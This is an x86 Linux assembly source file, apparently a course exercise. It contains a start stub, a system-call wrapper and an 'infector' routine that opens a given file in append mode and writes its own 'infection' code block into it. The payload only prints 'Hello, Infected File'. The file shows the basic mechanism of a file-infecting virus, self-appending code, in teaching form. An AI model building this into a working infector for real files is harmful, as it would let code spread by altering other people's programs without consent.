section .data
    newline db 0xA
    hello_msg db "Hello, Infected File", 0xA, 0
    hello_msg_len equ $ - hello_msg
    sys_exit equ 1
    sys_write equ 4
    sys_open equ 5
    sys_close equ 6
    stdout equ 1
    O_WRONLY equ 1
    O_APPEND equ 1024

section .bss
    buffer resb 1

section .text
global _start
global system_call
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )
    add     esp,12      ; clean up the stack

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    mov eax, sys_write
    mov ebx, stdout
    mov ecx, hello_msg
    mov edx, hello_msg_len
    int 0x80
    ret

infector:
    push ebp
    mov ebp, esp
    sub esp, 4
    pushad

    ; Open the file for appending
    mov eax, sys_open
    mov ebx, [ebp+8]
    mov ecx, O_WRONLY | O_APPEND
    mov edx, 0
    int 0x80
    mov [ebp-4], eax

    ; Write the infection code to the file
    mov eax, sys_write
    mov ebx, [ebp-4]
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    ; Close the file
    mov eax, sys_close
    mov ebx, [ebp-4]
    int 0x80

    popad
    add esp, 4
    pop ebp
    ret

code_end:
